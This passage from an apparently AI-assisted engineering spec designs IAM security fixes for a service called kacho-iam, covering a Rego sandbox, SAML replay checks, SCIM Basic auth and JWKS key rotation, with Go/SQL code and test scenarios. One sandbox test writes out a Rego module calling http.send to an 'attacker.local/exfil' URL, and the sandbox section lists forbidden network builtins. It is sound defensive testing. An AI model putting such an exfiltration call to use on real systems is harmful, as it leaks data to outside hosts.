| **OQ-W3.1-5** | #21: bootstrap-seed для `opa_scope_allowlist` — кто populated? Static-seed in migration vs runtime-bootstrap-job? | **Static-seed в `0025_opa_scope_allowlist.sql`** — INSERT INTO opa_scope_allowlist (tenant_id, scope) VALUES (tenant_id='*system', 'data.iam.users'), (...), ...). Tenant-specific scopes — admin-UI via new `InternalOpaScopeAllowlistService.Add/Remove` RPCs (out of W3.1 impl scope; W3.1 just provides the table + handler-side check; admin-UI добавляется в W2.A или W4). For W3.1 DoD: well-known scopes seeded + handler enforces — sufficient. |
| **OQ-W3.1-6** | #42: JWKS endpoint caching — `Cache-Control: max-age=60` ok для prod? Or `max-age=3600` для меньшей нагрузки на iam-pod? | **`max-age=300` (5min) default**, override via config. Trade-off: shorter → faster rotation propagation; longer → less load. 5min — industry common для JWKS (Auth0/Okta defaults). Manual rotation (DEC-W3.1-4) emits `Cache-Control: max-age=60` для emergency. |
| **OQ-W3.1-7** | #40 SAML replay store: TTL для `saml_response_replay` rows? Indefinite (anti-replay forever) or cleanup after `NotOnOrAfter`+max-clock-skew? | **TTL = NotOnOrAfter + 24h**, cleanup via daily cron in iam. Reasoning: после NotOnOrAfter assertion заведомо invalid (signature verify reject step 5 catches it); хранить row дольше — unnecessary growth. 24h buffer absorbs clock-skew edge cases. |
| **OQ-W3.1-8** | #41: SCIM Bearer-token support — оставлять (W2.B.2 default path) или заменить на Basic-only? | **Сохраняем оба.** Bearer для machine-to-machine integrations (OAuth2-style); Basic для legacy IdPs (Okta SCIM 2.0 supports Basic). Per-tenant конфиг `scim_basic_credentials`-row implies Basic enabled; absence implies Basic-disabled (Bearer-only). |
| **OQ-W3.1-9** | #23 ContextualTuples format: pass `request_context` as map-of-strings (1-level deep) или nested-jsonb? | **Map-of-strings (1-level)** — OpenFGA ContextualTuples API ожидает primitive values, не nested. Nested jsonb в `request_context` → flatten via `jq`-style path: `{"device": {"trust": "high"}}` → `attr_device_trust=high`. Document в proto comment. |
| **OQ-W3.1-10** | #26: integration-test для CPU timeout — как deterministically trigger? `while true {}` Rego loop? | **Yes** — fixture Rego module с infinite loop (`x { x }` — recursive eval): in test, `RunRegoTest(module=<loop>, cpu_timeout_ms=100)` — expected `DeadlineExceeded` within 100±50ms. OPA SDK respects `context.Done()` between rule evaluations. |

---

## 5. Implementation steps per finding (impl order)

> Recommended impl order: **independent finds first, glue last.** #21 + #23 — small, isolated. #25 — small, depends on `IsClusterAdmin` helper (existing). #26 — medium, depends on #21 (import allowlist шарит storage). #40/#41/#42 — independent of each other, parallel.

### 5.21 OPA scope-allowlist (#21)

1. **Migration** `0025_opa_scope_allowlist.sql`:
   ```sql
   CREATE TABLE IF NOT EXISTS kacho_iam.opa_scope_allowlist (
     tenant_id  text NOT NULL,
     scope      text NOT NULL,
     created_at timestamptz NOT NULL DEFAULT now(),
     PRIMARY KEY (tenant_id, scope)
   );
   -- bootstrap-seed: well-known catalogued OPA data sources for system tenant.
   INSERT INTO kacho_iam.opa_scope_allowlist (tenant_id, scope) VALUES
     ('*system', 'data.iam.users'),
     ('*system', 'data.iam.roles'),
     ('*system', 'data.iam.bindings'),
     ('*system', 'data.iam.projects')
   ON CONFLICT DO NOTHING;
   ```
2. **Repo** `internal/repo/opa_scope_repo.go`: `IsAllowed(ctx, tenantID, scope) (bool, error)` — `SELECT EXISTS(SELECT 1 FROM opa_scope_allowlist WHERE tenant_id IN ($1, '*system') AND scope=$2)`.
3. **Handler gate** в `internal/apps/kacho/api/internal_authorize/handler.go::RunRegoTest` AND future `OpaService`-endpoints (REST mapped `/opa/compile/v1`, `/opa/data/v1/iam/*` — registered в `kacho-api-gateway/internal/restmux/mux.go`): для каждой scope-string в request — `if !repo.IsAllowed(ctx, callerTenant, scope) { return PermissionDenied("Illegal argument scope: %q not in tenant allowlist") }`.
4. **Empty-allowlist fail-closed**: separate test — drop seed rows, call `RunRegoTest(scope='data.iam.users')` → `PermissionDenied`. Doc в handler comment.

### 5.23 CheckRelation ContextualTuples (#23)

1. **Service** `internal/service/authorize_service.go::CheckRelation`:
   ```go
   var ctxTuples []*openfgav1.TupleKey
   for k, v := range req.GetRequestContext().AsMap() { // jsonb → map[string]any
       // flatten 1-level
       sv, ok := v.(string)
       if !ok { sv = fmt.Sprint(v) }
       ctxTuples = append(ctxTuples, &openfgav1.TupleKey{
           User:     fmt.Sprintf("attr:%s", k),
           Relation: "value",
           Object:   fmt.Sprintf("string:%s", sv),
       })
   }
   resp, err := s.fga.Check(ctx, &openfgav1.CheckRequest{
       // ... existing fields ...
       ContextualTuples: &openfgav1.ContextualTupleKeys{TupleKeys: ctxTuples},
   })
   ```
2. **Validation**: `request_context` size cap 32 keys + 1KB per value (anti-DOS); malformed jsonb → `InvalidArgument` w/ text `"Illegal argument request_context: %s"`.
3. **No proto change** — `request_context` field already exists per KAC-127 frozen proto.

### 5.25 ReloadModel cluster-admin gate (#25)

1. **Handler** `internal/apps/kacho/api/internal_authorize/handler.go::ReloadModel`:
   ```go
   principal := authzguard.PrincipalUserID(ctx)
   if principal == "" {
       return nil, status.Error(codes.PermissionDenied, "authentication required")
   }
   if !h.iam.IsClusterAdmin(ctx, principal) {
       h.audit.Emit(ctx, "iam_admin_reload_model_denied",
           "principal", principal, "outcome", "not_cluster_admin")
       return nil, status.Error(codes.PermissionDenied,
           "ReloadModel requires cluster-admin grant")
   }
   // ... existing modelID swap ...
   h.audit.Emit(ctx, "iam_admin_reload_model_ok",
       "principal", principal, "new_model_id", req.GetModelId())
   ```
2. **Helper** `IsClusterAdmin(ctx, principal) bool` — DEC-W3.1-7; реализация via FGA `Check(cluster:default, system_admin, user:<id>)`.
3. **Audit-log shape**: `event:` + `principal:` + `outcome:` — structured slog. Wired to existing audit-outbox path.

### 5.26 RunRegoTest sandbox (#26)

1. **Proto** `kacho/cloud/iam/v1/internal_authorize_service.proto`: `RunRegoTestRequest` add fields `module_imports[]` (`repeated string`), `cpu_timeout_ms` (`uint32`, default 5000); `RunRegoTestResponse` add `denied_reason` (`string`, empty if eval ran).
2. **Cluster-admin gate** — same pattern as #25 (`h.iam.IsClusterAdmin`).
3. **Sandbox**:
   ```go
   // (a) Parse AST, walk for forbidden built-ins.
   mod, err := ast.ParseModule("user-test.rego", req.GetRego())
   if err != nil { return nil, InvalidArgument("Rego parse failed: %v", err) }
   if forbidden := walkForForbiddenBuiltins(mod); forbidden != "" {
       return &iamv1.RunRegoTestResponse{
           Allowed: false, DeniedReason: fmt.Sprintf("forbidden builtin: %s", forbidden),
       }, nil
   }
   // (b) Module import allowlist.
   for _, imp := range req.GetModuleImports() {
       if ok, _ := h.opaScope.IsAllowed(ctx, callerTenant, imp); !ok {
           return &iamv1.RunRegoTestResponse{
               Allowed: false, DeniedReason: fmt.Sprintf("import %q not in scope allowlist", imp),
           }, nil
       }
   }
   // (c) CPU timeout.
   cpuMs := req.GetCpuTimeoutMs(); if cpuMs == 0 || cpuMs > 5000 { cpuMs = 5000 }
   evalCtx, cancel := context.WithTimeout(ctx, time.Duration(cpuMs) * time.Millisecond)
   defer cancel()
   // (d) Memory limit + run.
   r := rego.New(rego.Module("user-test.rego", req.GetRego()),
       rego.Query("data.user.test.allow"),
       rego.PrintHook(nil),
       rego.RuntimeOpts(rego.RegoMaxIterations(100_000)))
   rs, err := r.Eval(evalCtx)
   if errors.Is(err, context.DeadlineExceeded) {
       return &iamv1.RunRegoTestResponse{
           Allowed: false, DeniedReason: "cpu_timeout_exceeded",
       }, nil
   }
   // ... normal result handling ...
   ```
4. **`walkForForbiddenBuiltins`** helper: traverse Rego AST via `ast.WalkExprs`, check `Expr.Operator()` name against deny-list set: `http.send`, `net.lookup_ip_addr`, `opa.runtime`, `io.jwt.decode`, `crypto.hmac.*`, `time.now_ns`, `rand.*`. Return name of first match.

### 5.40 SAML AuthnResponse verify (#40)

1. **Migration** `0028_saml_response_replay.sql`:
   ```sql
   CREATE TABLE IF NOT EXISTS kacho_iam.saml_response_replay (
     response_id  text PRIMARY KEY,  -- <samlp:Response>.ID
     tenant_id    text NOT NULL REFERENCES kacho_iam.accounts(id) ON DELETE CASCADE,
     idp_id       text NOT NULL,
     not_on_or_after timestamptz NOT NULL,
     consumed_at  timestamptz NOT NULL DEFAULT now()
   );
   CREATE INDEX saml_response_replay_cleanup_idx ON kacho_iam.saml_response_replay (not_on_or_after);
   ```
2. **Handler** `internal/apps/kacho/api/saml/sp_handler.go` — заменить `OnSAMLAssertion: nil` (W2.B.1 501) на:
   ```go
   sp := &saml.ServiceProvider{
       EntityID:    cfg.AcsURL,
       AcsURL:      mustParseURL(cfg.AcsURL),
       IDPMetadata: loadIDPMetadata(ctx, tenantID, idpID),
       AcceptedResponseSigningAlgorithms: []string{
           "http://www.w3.org/2001/04/xmldsig-more#rsa-sha256",
           "http://www.w3.org/2001/04/xmldsig-more#rsa-sha384",
           "http://www.w3.org/2001/04/xmldsig-more#rsa-sha512",
       },
       RequestTracker: postgresReplayTracker{db: h.db, tenantID: tenantID},
       Clock:          systemClock{},
   }
   assertion, err := sp.ParseResponse(req, []string{relayState.RequestID})
   if err != nil {
       h.audit.Emit(ctx, "saml_signature_invalid",
           "tenant", tenantID, "idp", idpID, "err", err.Error())
       http.Error(w, "SAML response verification failed", http.StatusUnauthorized)
       return
   }
   // JIT-provision via UserService.Create (existing path, returns Operation)
   ```
3. **`postgresReplayTracker`** implements `crewjam/saml.RequestTracker` interface; `TrackRequest` → INSERT replay-row at AuthnRequest issuance; `GetTrackedRequests` checks `WHERE response_id = $1 AND not_on_or_after > now()`; PK conflict on second consume = 23505 → reject.
4. **Audit**: events `saml_signature_invalid`, `saml_replay_rejected`, `saml_recipient_mismatch`, `saml_audience_mismatch`, `saml_not_on_or_after_expired`, `saml_jit_provisioned_ok` — все с `tenant`+`idp`+`subject` (subject only on success — on fail just hashed-form fingerprint to avoid logging arbitrary attacker input).

### 5.41 SCIM Basic-auth (#41)

1. **Migration** `0027_scim_basic_credentials.sql`:
   ```sql
   CREATE TABLE IF NOT EXISTS kacho_iam.scim_basic_credentials (
     tenant_id        text NOT NULL REFERENCES kacho_iam.accounts(id) ON DELETE CASCADE,
     username         text NOT NULL,
     password_bcrypt  text NOT NULL,
     created_at       timestamptz NOT NULL DEFAULT now(),
     last_used_at     timestamptz,
     PRIMARY KEY (tenant_id, username)
   );
   ```
2. **Middleware** `internal/apps/kacho/api/scim/auth.go::BasicAuthMiddleware`:
   ```go
   user, pass, ok := r.BasicAuth()
   if !ok {
       w.Header().Set("WWW-Authenticate", `Basic realm="SCIM"`)
       http.Error(w, "Unauthorized", http.StatusUnauthorized)
       return
   }
   tenantID := extractTenantFromPath(r.URL.Path) // /scim/v2/<tenant>/Users
   row, err := h.repo.GetSCIMCredential(r.Context(), tenantID, user)
   if errors.Is(err, pgx.ErrNoRows) {
       // anti-timing: do dummy bcrypt compare to equalize latency
       _ = bcrypt.CompareHashAndPassword([]byte(dummyHash), []byte(pass))
       http.Error(w, "Unauthorized", http.StatusUnauthorized)
       return
   }
   if err := bcrypt.CompareHashAndPassword([]byte(row.PasswordBcrypt), []byte(pass)); err != nil {
       http.Error(w, "Unauthorized", http.StatusUnauthorized)
       return
   }
   _ = h.repo.TouchSCIMCredentialLastUsed(r.Context(), tenantID, user) // best-effort
   ctx := withSCIMTenant(r.Context(), tenantID)
   next.ServeHTTP(w, r.WithContext(ctx))
   ```
3. **Admin RPC** `InternalScimCredentialService.{Create,Delete,List}` on internal-port — admin-UI provisioning. Out of W3.1 impl scope (W2.A admin-UI integration); stub-impl in W3.1 returns `Unimplemented` IF admin-UI not yet wired. Manual seed via SQL fixture acceptable для test-stand.
   > **Per Запрет #11**: stub `Unimplemented` IS tech debt → resolve by either implementing fully OR explicitly marking «no admin RPC until W4-admin-UI sprint; SCIM creds seed via SQL» as out-of-scope boundary. **Recommendation**: implement minimal `Create/Delete/List` RPCs (~50 lines each, standard CRUD) in W3.1 — no TODO.
4. **Newman fixture**: setup script POSTs SCIM credential via admin path; positive test uses correct Basic header; negative — wrong creds / missing header.

### 5.42 CAEP SET signing + JWKS endpoint (#42)

1. **Migration** `0026_jwks_keys.sql`:
   ```sql
   CREATE TABLE IF NOT EXISTS kacho_iam.jwks_keys (
     kid                         text PRIMARY KEY,
     alg                         text NOT NULL CHECK (alg='RS256'),
     public_key_pem              text NOT NULL,
     private_key_pem_encrypted   bytea NOT NULL,  -- AES-GCM via master key
     active                      boolean NOT NULL,
     created_at                  timestamptz NOT NULL DEFAULT now(),
     rotated_at                  timestamptz,
     expires_at                  timestamptz NOT NULL
   );
   -- Только одна active row одновременно — partial UNIQUE.
   CREATE UNIQUE INDEX jwks_keys_one_active_uniq
       ON kacho_iam.jwks_keys ((1)) WHERE active = true;
   ```
2. **Service** `internal/service/jwks/store.go`:
   - `Initialize(ctx)` — on iam-startup: если 0 active rows, generate RSA 2048-bit, encrypt private via `KACHO_IAM_JWKS_MASTER_KEY` (AES-GCM), INSERT row.
   - `GetActiveKey(ctx)` — `SELECT ... WHERE active=true LIMIT 1`; cache 30s.
   - `GetAllPublicKeys(ctx)` — `SELECT kid, alg, public_key_pem FROM jwks_keys WHERE expires_at > now()` — for JWKS endpoint.
   - `Rotate(ctx)` — atomic transaction: `UPDATE jwks_keys SET active=false, rotated_at=now() WHERE active=true; INSERT new active=true`. Partial UNIQUE constraint ensures no race.
3. **SET signer** `internal/service/caep/set_signer.go::Sign(claims jwt.Claims) (string, error)`:
   ```go
   key, err := s.store.GetActiveKey(ctx)
   if err != nil { return "", err }
   token := jwt.NewWithClaims(jwt.SigningMethodRS256, claims)
   token.Header["kid"] = key.Kid
   priv, err := decryptAndParseRSAPrivateKey(key.PrivateKeyPemEncrypted, masterKey)
   if err != nil { return "", err }
   return token.SignedString(priv)
   ```
4. **JWKS REST endpoint** in `cmd/kacho-iam/main.go` — public mux:
   ```go
   mux.HandleFunc("/.well-known/jwks.json", func(w http.ResponseWriter, r *http.Request) {
       keys, _ := jwksStore.GetAllPublicKeys(r.Context())
       resp := jwksResponse{Keys: make([]jwk, 0, len(keys))}
       for _, k := range keys {
           pub, _ := pem.Decode([]byte(k.PublicKeyPem))
           rsaPub, _ := x509.ParsePKIXPublicKey(pub.Bytes)
           pk := rsaPub.(*rsa.PublicKey)
           resp.Keys = append(resp.Keys, jwk{
               Kty: "RSA", Use: "sig", Alg: k.Alg, Kid: k.Kid,
               N:   base64.RawURLEncoding.EncodeToString(pk.N.Bytes()),
               E:   base64.RawURLEncoding.EncodeToString(big.NewInt(int64(pk.E)).Bytes()),
           })
       }
       w.Header().Set("Cache-Control", "max-age=300, public")
       w.Header().Set("Content-Type", "application/jwk-set+json")
       json.NewEncoder(w).Encode(resp)
   })
   ```
   **Note (CLAUDE.md §«Инфра-чувствительные»)**: response NEVER contains `private_key_pem_encrypted` or master key. Only `kid`, `n`, `e` public-key half. RFC 7517 standard format.
5. **Rotation cron** — `internal/service/jwks/rotation_cron.go`: ticker every 24h; if `now() - active_key.created_at > 30 days` → `Rotate()`.
6. **Caep egress handler** `internal/handler/iamhooks/caep_egress_handler.go` — replace stub-sign with `setSigner.Sign(claims)` call. Subscriber-side verify is **subscriber's** responsibility per RFC 8417 §7.2; W3.1 newman test instantiates a stub subscriber that fetches `/.well-known/jwks.json` and verifies.

---

## 6. Сценарии (Given-When-Then) — основа интеграционных тестов

> All scenarios assume: Postgres testcontainer with migrations 0001-0028 applied; OpenFGA testcontainer with bootstrap-model loaded; iam-server stood up via bufconn with all middlewares (anti-anon W1.6, authz-guard, audit-outbox) mounted. SAML scenarios use `crewjam/saml` test-fixtures; SCIM scenarios use HTTP client with custom headers; CAEP scenarios use real RSA keypair generation.

### 6.21 OPA scope-allowlist (#21)

#### Scenario W3.1-21-HAPPY — allowlisted scope → eval proceeds

**ID**: W3.1-21-HAPPY

**Given** `opa_scope_allowlist` seeded with `(*system, data.iam.users)`
**And** principal `usr_cluster_admin` has cluster-admin grant (W1.5 BG.ApproveB path)
**And** ctx contains tenant `acc_t1`

**When** `InternalAuthorizeService.RunRegoTest(rego=<noop module that returns true>, module_imports=["data.iam.users"], cpu_timeout_ms=1000)`

**Then** response `Allowed=true`, `DeniedReason=""`
**And** audit log emits `event: iam_admin_run_rego_test_ok`

---

#### Scenario W3.1-21-UNKNOWN-SCOPE — non-allowlisted scope → 403

**ID**: W3.1-21-UNKNOWN

**Given** allowlist seeded with `data.iam.users` only
**And** principal is cluster-admin

**When** `RunRegoTest(module_imports=["data.attacker_controlled.malicious"])`

**Then** response `Allowed=false, DeniedReason='import "data.attacker_controlled.malicious" not in scope allowlist'`
**And** structured log `event: opa_scope_not_allowlisted, scope: "data.attacker_controlled.malicious"`

---

#### Scenario W3.1-21-EMPTY-ALLOWLIST-FAIL-CLOSED — mis-bootstrap → deny all

**ID**: W3.1-21-EMPTY-FAIL-CLOSED

**Given** `opa_scope_allowlist` is empty (test deletes all rows after migration)
**And** principal is cluster-admin

**When** `RunRegoTest(module_imports=["data.iam.users"])`

**Then** response `Allowed=false, DeniedReason='import "data.iam.users" not in scope allowlist'`
**And** test asserts NO empty-allowlist-equals-allow-all bypass exists (regression-prevention)

---

### 6.23 CheckRelation ContextualTuples (#23)

#### Scenario W3.1-23-HAPPY-MFA — conditional binding with MFA context → allow

**ID**: W3.1-23-HAPPY

**Given** AccessBinding `acb_x` granting user `usr_admin` admin on `project:prj_y` with condition `mfa_fresh=true` (writes ABAC predicate to FGA condition)
**And** OpenFGA model includes conditional relation `admin` requiring `attr_mfa_fresh=true`

**When** `InternalIAMService.CheckRelation(subject="user:usr_admin", relation="admin", object="project:prj_y", request_context={"mfa_fresh":"true","source_ip":"10.0.0.5"})`

**Then** response `Allowed=true`
**And** FGA Check was called with `ContextualTuples` containing `[(attr:mfa_fresh, value, string:true), (attr:source_ip, value, string:10.0.0.5)]`

---

#### Scenario W3.1-23-CONTEXT-DENY — same binding, no MFA in context → deny

**ID**: W3.1-23-CONTEXT-DENY

Same setup; call without `mfa_fresh` in `request_context`:

**When** `CheckRelation(..., request_context={"source_ip":"10.0.0.5"})`

**Then** response `Allowed=false`
**And** ABAC condition unsatisfied — proves ContextualTuples plumbed correctly (pre-W3.1: always deny because field ignored; post-W3.1: deny only when condition not met)

---

#### Scenario W3.1-23-MALFORMED — invalid request_context → InvalidArgument

**ID**: W3.1-23-MALFORMED

**Given** principal authenticated

**When** `CheckRelation(..., request_context=<33-key map>)` (exceeds 32-key cap per §5.23)

**Then** returns `codes.InvalidArgument` with text containing `"Illegal argument request_context"`

---

### 6.25 ReloadModel cluster-admin gate (#25)

#### Scenario W3.1-25-HAPPY — cluster-admin reloads model → version bump

**ID**: W3.1-25-HAPPY

**Given** principal `usr_cluster_admin` has cluster-admin grant
**And** current `modelID` = "01H...A"
**And** new model written to OpenFGA returning `modelID` = "01H...B"

**When** `InternalAuthorizeService.ReloadModel(model_id="01H...B")`

**Then** response 200 OK, `currentModelID` mutated to "01H...B"
**And** subsequent `AuthorizeService.Check` uses "01H...B" model (verified by mocked OpenFGA client)
**And** audit log emits `event: iam_admin_reload_model_ok, principal: usr_cluster_admin, new_model_id: 01H...B`

---

#### Scenario W3.1-25-ANON-DENY — anonymous ReloadModel → 401

**ID**: W3.1-25-ANON-DENY

**Given** ctx is anonymous (no principal in context)

**When** `ReloadModel(model_id="01H...B")`

**Then** returns `codes.PermissionDenied` with text `"authentication required"`
**And** `currentModelID` NOT mutated (verified)
**And** anti-anon interceptor (W1.6) fired BEFORE handler reached (verified via interceptor metric)

---

#### Scenario W3.1-25-NON-ADMIN-DENY — authenticated non-admin → 403

**ID**: W3.1-25-NON-ADMIN

**Given** principal `usr_regular` is authenticated but has no cluster-admin grant

**When** `ReloadModel(model_id="01H...B")`

**Then** returns `codes.PermissionDenied` with text `"ReloadModel requires cluster-admin grant"`
**And** audit log emits `event: iam_admin_reload_model_denied, principal: usr_regular, outcome: not_cluster_admin`
**And** `currentModelID` NOT mutated

---

### 6.26 RunRegoTest sandbox (#26)

#### Scenario W3.1-26-HAPPY — bounded Rego eval → returns result

**ID**: W3.1-26-HAPPY

**Given** cluster-admin principal; allowlist seeded
**And** module: `package user.test; allow { data.iam.users[_].active == true }`

**When** `RunRegoTest(rego=<module>, module_imports=["data.iam.users"], cpu_timeout_ms=2000)`

**Then** response `Allowed=true` (assuming seed data has active user)
**And** `DeniedReason=""`

---

#### Scenario W3.1-26-FORBIDDEN-BUILTIN — http.send → reject at parse-time

**ID**: W3.1-26-FORBIDDEN-HTTP

**Given** cluster-admin principal
**And** module: `package user.test; allow { http.send({"method":"GET","url":"http://attacker.local/exfil"}) }`

**When** `RunRegoTest(rego=<module>, ...)`

**Then** response `Allowed=false, DeniedReason="forbidden builtin: http.send"`
**And** structured log `event: rego_sandbox_blocked, builtin: http.send`
**And** no outbound HTTP request to `attacker.local` was made (verified via test-stub network monitor)

---

#### Scenario W3.1-26-CPU-TIMEOUT — infinite loop module → DeadlineExceeded → 403

**ID**: W3.1-26-CPU-TIMEOUT

**Given** cluster-admin principal
**And** module: `package user.test; allow { x }; x { x }` (recursive eval per OQ-W3.1-10)

**When** `RunRegoTest(rego=<module>, cpu_timeout_ms=100)`

**Then** response `Allowed=false, DeniedReason="cpu_timeout_exceeded"`
**And** elapsed time ≤ 150ms (i.e. timeout actually fired, not test-harness timeout)

---

#### Scenario W3.1-26-UNKNOWN-IMPORT — import not in allowlist → 403

**ID**: W3.1-26-UNKNOWN-IMPORT

**Given** allowlist = {`data.iam.users`}; module imports `data.iam.secrets` (not in list)

**When** `RunRegoTest(rego=<module>, module_imports=["data.iam.secrets"])`

**Then** response `Allowed=false, DeniedReason='import "data.iam.secrets" not in scope allowlist'`

---

#### Scenario W3.1-26-NON-ADMIN-DENY — non-cluster-admin → 403 (parity with #25)

**ID**: W3.1-26-NON-ADMIN

Symmetric to W3.1-25-NON-ADMIN. Authenticated non-admin → `PermissionDenied("RunRegoTest requires cluster-admin grant")`.

---

### 6.40 SAML AuthnResponse verify (#40)

#### Scenario W3.1-40-HAPPY — trusted IdP cert + valid signature → JIT user

**ID**: W3.1-40-HAPPY

**Given** Tenant `acc_t40` has `federation_trust_policies` row for IdP `idp_okta_test` with cert `<test-cert.pem>`
**And** Test fixture generates valid AuthnRequest, signs Response with corresponding private key, sets `InResponseTo` = AuthnRequest.ID, `NotOnOrAfter` = now+5min, `Recipient` = our ACS URL, `Audience` = our SP entity-ID
**And** Signature algorithm = `rsa-sha256`

**When** POST `/saml/v2/acs?tenant=acc_t40&idp=idp_okta_test` with the signed Response

**Then** HTTP 302 redirect to post-login URL
**And** new user row created in `kacho_iam.users` with `email` from assertion `<saml:Subject>` and `account_id=acc_t40`
**And** `Operation` returned (async via UserService.Create) — eventual `done=true`
**And** `saml_response_replay` table has row with `response_id` = Response.ID
**And** audit log: `event: saml_jit_provisioned_ok, tenant: acc_t40, idp: idp_okta_test, subject: <email>`

---

#### Scenario W3.1-40-TAMPERED-SIGNATURE — signature mismatch → 401

**ID**: W3.1-40-TAMPERED

**Given** same setup as W3.1-40-HAPPY
**And** Response XML body modified after signing (e.g. `email` attribute changed) → signature no longer matches

**When** POST `/saml/v2/acs?tenant=acc_t40&idp=idp_okta_test`

**Then** HTTP 401 Unauthorized
**And** audit log: `event: saml_signature_invalid, tenant: acc_t40, idp: idp_okta_test`
**And** no row in `kacho_iam.users` for the (would-be) subject
**And** `saml_response_replay` does NOT contain this Response.ID (rejected before consume)

---

#### Scenario W3.1-40-EXPIRED-NOTONORAFTER — stale assertion → 401

**ID**: W3.1-40-EXPIRED

**Given** Response signed correctly but `NotOnOrAfter` = now-5min (stale)

**When** POST `/saml/v2/acs`

**Then** HTTP 401
**And** audit log: `event: saml_not_on_or_after_expired`

---

#### Scenario W3.1-40-REPLAY — same Response.ID twice → 401 on second

**ID**: W3.1-40-REPLAY

**Given** Valid signed Response posted once successfully (W3.1-40-HAPPY)

**When** POST the same Response (identical bytes) a second time

**Then** HTTP 401
**And** audit log: `event: saml_replay_rejected, response_id: <id>`
**And** Postgres logged `23505` PK conflict on `saml_response_replay` INSERT (verified via test log capture)

---

#### Scenario W3.1-40-WEAK-ALG — rsa-sha1 signature → 401

**ID**: W3.1-40-WEAK-ALG

**Given** Response signed with `rsa-sha1` (deprecated but still common in legacy IdPs)

**When** POST `/saml/v2/acs`

**Then** HTTP 401
**And** audit log: `event: saml_signature_invalid, reason: weak_alg, alg: rsa-sha1`

---

#### Scenario W3.1-40-WRONG-RECIPIENT — Recipient ≠ our ACS URL → 401

**ID**: W3.1-40-WRONG-RECIPIENT

**Given** Response signed correctly but `<saml:SubjectConfirmationData Recipient="https://attacker.com/acs">`

**When** POST `/saml/v2/acs` (our URL)

**Then** HTTP 401
**And** audit log: `event: saml_recipient_mismatch, expected: <ours>, got: https://attacker.com/acs`

---

### 6.41 SCIM Basic-auth (#41)

#### Scenario W3.1-41-HAPPY-BASIC — correct Basic creds → SCIM CRUD works

**ID**: W3.1-41-HAPPY

**Given** `scim_basic_credentials` row `(tenant_id=acc_t41, username=okta-scim, password_bcrypt=bcrypt("supersecret"))`

**When** POST `/scim/v2/acc_t41/Users` with header `Authorization: Basic <base64("okta-scim:supersecret")>` and SCIM-formatted user body

**Then** HTTP 201 Created
**And** new user row in `kacho_iam.users` with `account_id=acc_t41`
**And** `scim_basic_credentials.last_used_at` updated

---

#### Scenario W3.1-41-MISSING-HEADER — no Authorization → 401

**ID**: W3.1-41-MISSING

**When** POST `/scim/v2/acc_t41/Users` with no `Authorization` header

**Then** HTTP 401
**And** response header `WWW-Authenticate: Basic realm="SCIM"`
**And** no user row created

---

#### Scenario W3.1-41-WRONG-CREDS — wrong password → 401, constant-time

**ID**: W3.1-41-WRONG-CREDS

**Given** correct credential exists for `(acc_t41, okta-scim)`

**When** POST with `Authorization: Basic <base64("okta-scim:WRONG")>`

**Then** HTTP 401
**And** response time within ±20ms of W3.1-41-HAPPY response time (constant-time bcrypt + dummy-compare for missing-row case ensures no timing oracle)
**And** audit log: `event: scim_auth_failed, tenant: acc_t41, username: okta-scim`

---

#### Scenario W3.1-41-UNKNOWN-USER — username not in table → 401 (no enumeration)

**ID**: W3.1-41-UNKNOWN-USER

**When** POST with `Authorization: Basic <base64("nonexistent:anything")>`

**Then** HTTP 401
**And** response time matches W3.1-41-WRONG-CREDS within ±20ms (dummy bcrypt compare equalizes latency)
**And** no audit log entry (avoids log-flooding by enumeration attacks; correct creds shape only)

---

### 6.42 CAEP SET signing + JWKS (#42)

#### Scenario W3.1-42-HAPPY-SIGN-VERIFY — subscriber verifies SET via JWKS

**ID**: W3.1-42-HAPPY

**Given** iam-server bootstrap generated active RSA keypair stored in `jwks_keys` (kid=`k1`)
**And** test-subscriber HTTP stub starts, fetches `GET /.well-known/jwks.json`, parses keys
**And** iam triggers CAEP push for event `iam.session.revoked` (sub_id=`usr_t42`)

**When** iam sends `POST <subscriber_url>` with SET in body, header `Content-Type: application/secevent+jwt`

**Then** subscriber decodes JWT header, extracts `kid=k1`
**And** subscriber looks up `k1` in fetched JWKS → finds public key (n, e)
**And** subscriber verifies signature → valid → accepts SET → revokes session

---

#### Scenario W3.1-42-REVOKED-KEY-REJECT — SET signed by rotated-out key → subscriber rejects

**ID**: W3.1-42-REVOKED-KEY

**Given** iam rotated keypair: old `k1` marked `active=false, rotated_at=now()`, new `k2` active
**And** **time advances past `k1.expires_at`** (test simulates via clock-skew injection — `k1` removed from JWKS)
**And** subscriber fetches fresh JWKS — sees only `k2`

**When** iam (test-injected to use stale `k1`) sends SET signed with `k1`

**Then** subscriber decodes header, sees `kid=k1`, looks up `k1` in JWKS → not found → rejects
**And** subscriber returns HTTP 400 to iam with reason `"unknown_kid"`
**And** verifies the JWKS lookup IS the source of truth (not the signature itself — which is still mathematically valid, just from an expired key)

---

#### Scenario W3.1-42-ROTATION-OVERLAP — both old and new keys served for 60-day window

**ID**: W3.1-42-ROTATION-OVERLAP

**Given** iam rotated keypair 1 day ago — `k1` `active=false, rotated_at=now()-24h, expires_at=now()+59d`; `k2` `active=true`
**And** subscriber holds in-flight SET signed by `k1` (before rotation)

**When** subscriber fetches `GET /.well-known/jwks.json`

**Then** response contains BOTH `k1` AND `k2` (since `k1.expires_at` not yet reached)
**And** subscriber can verify the in-flight SET successfully
**And** new SETs are signed with `k2` (verified by inspecting outbound SET header)

---

#### Scenario W3.1-42-JWKS-NO-PRIVATE-LEAK — endpoint never returns private key

**ID**: W3.1-42-NO-LEAK

**Given** `jwks_keys` row contains `private_key_pem_encrypted` (bytea, AES-GCM ciphertext)

**When** `GET /.well-known/jwks.json`

**Then** response body parsed as JSON — for each key, field set is exactly `{kty, use, alg, kid, n, e}`
**And** NO field named `d`, `p`, `q`, `dp`, `dq`, `qi` (RSA private components per RFC 7518)
**And** NO field named `private_key_pem_encrypted`, `private_key`, `master_key`, or similar
**And** response body size < 2KB (sanity check — full keypair would be much larger)

---

#### Scenario W3.1-42-ROTATION-ATOMIC — concurrent rotation calls → only one active

**ID**: W3.1-42-ROTATION-ATOMIC

**Given** initial state: `k1` active

**When** 5 concurrent goroutines call `jwksStore.Rotate(ctx)` simultaneously

**Then** post-condition: exactly 1 row has `active=true` (verified via `SELECT count(*) WHERE active=true`)
**And** 4 of 5 goroutines returned `pgx.ErrIntegrityViolation` (23505 on `jwks_keys_one_active_uniq` partial UNIQUE during INSERT race) → service maps to `FailedPrecondition`
**And** 1 goroutine succeeded
**And** no two rows have `active=true` (race-proof per Запрет #10)

---

## 7. Test plan

### 7.1 Per-finding integration tests (testcontainers)

| Finding | Test file (kacho-iam) | Tests |
|---|---|---|
